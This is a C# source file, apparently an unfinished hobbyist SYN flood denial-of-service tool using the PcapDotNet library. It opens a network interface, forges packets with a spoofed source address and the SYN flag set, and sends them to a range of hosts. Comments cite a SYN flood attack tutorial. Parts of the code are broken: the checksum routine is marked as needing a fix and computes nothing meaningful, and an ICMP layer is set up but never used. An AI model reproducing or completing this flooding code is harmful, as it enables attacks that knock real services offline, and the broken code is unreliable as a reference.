using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Gre;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.Igmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.IpV6;
using PcapDotNet.Packets.Transport;

namespace synflood
{
    /* 
    Links I found for help
    https://msdn.microsoft.com/en-us/library/system.bitconverter(v=vs.110).aspx
    https://msdn.microsoft.com/library/system.net.ipaddress
    https://msdn.microsoft.com/en-us/library/system.net.socketaddress(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/system.net.endpoint(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/eae4f5y0(v=vs.110).aspx
    https://msdn.microsoft.com/en-us/library/system.net.ipaddress(v=vs.110).aspx
    https://stackoverflow.com/questions/2850815/what-is-the-inet-addr-function-equivalent-in-c-sharp
    syn flood in C
    https://www.binarytides.com/syn-flood-dos-attack/
    */
    class SynFlood
    {
        //checksum fucntion
        //need to fix and further research
        int csum(int ptr, int nbytes)
        {
            int sum;
            int oddbyte;
            int answer;

            sum = 0;
            while (nbytes > 1)
            {
                sum += ptr++;
                nbytes -= 2;
            }

            if (nbytes == 1)
            {
                oddbyte = 0;
                oddbyte = ptr;
                sum += oddbyte;
            }


            sum = (sum >> 16) + (sum & 0xffff);
            sum = sum + (sum >> 16);
            answer = (short)~sum;

            return (answer);
        }

        static void MainSynFlood(string[] args)
        {

            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Print the list
            for (int i = 0; i != allDevices.Count; ++i)
            {
                LivePacketDevice device = allDevices[i];
                Console.Write((i + 1) + ". " + device.Name);
                if (device.Description != null)
                    Console.WriteLine(" (" + device.Description + ")");
                else
                    Console.WriteLine(" (No description available)");
            }

            int deviceIndex = 0;
            do
            {
                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
                string deviceIndexString = Console.ReadLine();
                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
                    deviceIndex < 1 || deviceIndex > allDevices.Count)
                {
                    deviceIndex = 0;
                }
            } while (deviceIndex == 0);

            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[deviceIndex - 1];

            // Open the output device
            using (PacketCommunicator communicator = selectedDevice.Open(100, // name of the device
                                                                         PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                                                         1000)) // read timeout
            {
                // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
                MacAddress source = new MacAddress("01:01:01:01:01:01");

                // set mac destination to 02:02:02:02:02:02
                MacAddress destination = new MacAddress("02:02:02:02:02:02");

                // Create the packets layers

                // Ethernet Layer
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = source,
                    Destination = destination
                };

                // IPv4 Layer
                IpV4Layer ipV4Layer = new IpV4Layer
                {
                    Source = new IpV4Address("1.2.3.4"),
                    Ttl = 128,
                    // The rest of the important parameters will be set for each packet
                };

                // ICMP Layer
                IcmpEchoLayer icmpLayer = new IcmpEchoLayer();

                // TCP LAYER
                TcpLayer tcpLayer = new TcpLayer();
                tcpLayer.ControlBits = TcpControlBits.Synchronize;

                // Create the builder that will build our packets
                PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);

                // Send 100 Pings to different destination with different parameters
                for (int i = 0; i != 100; ++i)
                {
                    // Set IPv4 parameters
                    ipV4Layer.CurrentDestination = new IpV4Address("2.3.4." + i);
                    ipV4Layer.Identification = (ushort)i;

                    // Set ICMP parameters
                    icmpLayer.SequenceNumber = (ushort)i;
                    icmpLayer.Identifier = (ushort)i;

                    // Build the packet
                    Packet packet = builder.Build(DateTime.Now);

                    // Send down the packet
                    communicator.SendPacket(packet);
                }
            }

        }
    }
}